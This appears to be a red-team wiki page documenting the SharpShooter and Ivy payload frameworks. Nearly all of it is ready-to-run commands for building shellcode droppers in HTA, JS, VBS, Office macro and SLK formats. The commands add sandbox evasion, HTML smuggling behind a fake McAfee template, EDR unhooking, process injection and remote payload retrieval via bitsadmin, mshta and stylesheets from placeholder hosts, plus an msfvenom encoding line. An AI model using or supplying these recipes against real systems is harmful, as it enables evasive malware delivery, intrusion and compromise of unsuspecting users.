# ⭕ SharpShooter & Ivy

## <mark style="color:red;">SharpSooter</mark>

{% embed url="https://github.com/mdsecactivebreach/SharpShooter" %}

SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code.

```
git clone https://github.com/mdsecactivebreach/SharpShooter.git
```

SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS and WSF.

### <mark style="color:orange;">Stageless JavaScript</mark>

```
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
```

Create a stageless JavaScript payload targeting version 4 of the .NET framework. This example will create a payload named foo.js in the output directory. The shellcode is read from the ./raw.txt file. The payload attempts to enforce some sandbox evasion by keying execution to the CONTOSO domain, and checking for known sandbox/VM artifacts.

### <mark style="color:orange;">Stageless HTA</mark>

```
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
```

Create a stageless HTA payload targeting version 2/3 of the .NET framework. This example will create a payload named foo.hta in the output directory. The shellcode is read from the ./raw.txt file. The payload attempts to enforce some sandbox evasion by checking for known virtual MAC addresses. A HTML smuggling payload will also be generated named foo.html in the output directory. This payload will use the example McAfee virus scan template.

### <mark style="color:orange;">Staged VBS</mark>

```
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
```

This example creates a staged VBS payload that performs both Web and DNS delivery. The payload will attempt to retrieve a GZipped CSharp file that executes the shellcode supplied as a CSharp byte array in the csharpsc.txt file. The CSharp file used is the built-in SharpShooter shellcode execution template. The payload is created in the output directory named foo.payload and should be hosted on [http://www.foo.bar/shellcode.payload](http://www.foo.bar/shellcode.payload). The same file should also be hosted on the bar.foo domain using PowerDNS to serve it. The VBS file will attempt to key execution to the CONTOSO domain and will be embedded in a HTML file using the HTML smuggling technique with the McAfee virus scanned template. The resultant payload is stored in the output directory named foo.html.

### <mark style="color:orange;">Custom CSharp inside VBS</mark>

```
SharpShooter.py --dotnetver 2 --payload js --sandbox 2,3,4,5 --delivery web --refs mscorlib.dll,System.Windows.Forms.dll --namespace MDSec.SharpShooter --entrypoint Main --web http://www.phish.com/implant.payload --output malicious --smuggle --template mcafee
```

This example demonstrates how to create a staged JS payload that performs web delivery, retrieving a payload from [http://www.phish.com/implant.payload](http://www.phish.com/implant.payload). The generated payload will attempt sandbox evasion, and attempt to compile the retrieved payload which requires mscorlib.dll and System.Windows.Forms.dll as DLL references. The Main method in the MDSec.SharpShooter namespace will be executed on successful compilation.

### <mark style="color:orange;">Creation of a Squiblytwo VBS</mark>

```
SharpShooter.py --stageless --dotnetver 2 --payload vbs --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com outlook --awlurl http://192.168.2.8:8080/foo.xsl
```

This example creates a VBS smuggled COM stager that uses the Outlook.CreateObject() COM method as a primitive to execute wmic.exe to execute a hosted stylesheet. The --awl parameter is not used by defaults to wmic.

### <mark style="color:orange;">Creation of a XSL HTA</mark>

```
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
```

This example creates a HTA smuggled file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.

### <mark style="color:orange;">Creation of a VBA Macro</mark>

```
SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
```

This example creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.

### <mark style="color:orange;">Creation of an Excel 4.0 SLK Macro Enabled Document</mark>

```
SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee
```

This example creates an Excel 4.0 SLK file that executes the supplied shellcode and wraps it in HTML. The shellcode cannot contain null bytes, hint:

```
msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\x00'
```



## <mark style="color:red;">Ivy</mark>

Ivy is a payload creation framework for the execution of arbitrary VBA (macro) source code in memory. Ivy’s loader does this by abusing programmatical access in the VBA object environment to load, decrypt, and execute shellcode.

{% embed url="https://github.com/optiv/Ivy" %}

```
git clone https://github.com/optiv/Ivy.git
```

#### <mark style="color:green;">Staged Inject payload</mark>

```
./Ivy -Ix64 test64.vba -Ix86 test32.vba -P Inject -O SampleInject.js
```

#### <mark style="color:green;">Staged Local payload</mark>

```
./Ivy -Ix64 test64.c -Ix86 test32.c -P Local -O SampleLocal.js
```

#### <mark style="color:green;">Stagless Local payload</mark>

```
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O stageless.js
```

#### <mark style="color:green;">Stagless Injected payload</mark>

```
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -O stageless.js
```

#### <mark style="color:green;">Stagless Injected payload spawning notepad.exe</mark>

```
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -process64 C:\\windows\\system32\\notepad.exe -process32 C:\\windows\\SysWOW64\\notepad.exe -O stageless.js
```

#### <mark style="color:green;">Unhooked Stagless Local payload</mark>

```
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -unhook -O stageless.js
```

#### <mark style="color:green;">Unhooked Stagless Injected payload</mark>

```
./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -unhook -O stageless.js
```

### <mark style="color:orange;">One Liner Commands Samples</mark>

#### <mark style="color:green;">Non-Executable File Types</mark>

```
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -O test.png -stageless
```

#### <mark style="color:green;">Bitsadmin Command</mark>

```
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.js -url http://ACME.com -delivery bits -stageless
```

#### <mark style="color:green;">MSHTA.exe Command</mark>

```
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.hta -url http://ACME.com -delivery hta -stageless
```

#### <mark style="color:green;">Stylesheet Payload</mark>

```
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.xsl -url http://ACME.com -delivery xsl -stageless
```

#### <mark style="color:green;">Macro Web Downloader</mark>

```
./Ivy -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O test.txt -url http://ACME.com/test.txt -delivery macro -stageless
```
